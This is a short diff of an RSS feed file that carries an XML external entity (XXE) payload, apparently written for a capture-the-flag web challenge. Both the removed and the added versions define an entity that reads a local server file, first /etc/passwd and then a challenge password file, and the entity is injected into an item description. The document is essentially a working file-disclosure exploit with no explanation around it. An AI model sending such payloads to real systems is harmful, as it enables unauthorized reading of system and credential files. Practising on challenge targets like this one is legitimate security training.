@@ -1,6 +1,6 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE rss [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE rss[
+  <!ENTITY xxe SYSTEM "file:///challenge/web-serveur/ch29/.passwd" >
 ]>
 <rss version="2.0">
 <channel>
@@ -11,11 +11,6 @@
     <title>RSS Tutorial</title>
     <link>https://www.w3schools.com/xml/xml_rss.asp</link>
     <description>&xxe;</description>
-  </item>
-  <item>
-    <title>XML Tutorial</title>
-    <link>https://www.w3schools.com/xml</link>
-    <description>New XML tutorial on W3Schools</description>
   </item>
 </channel>
 </rss>
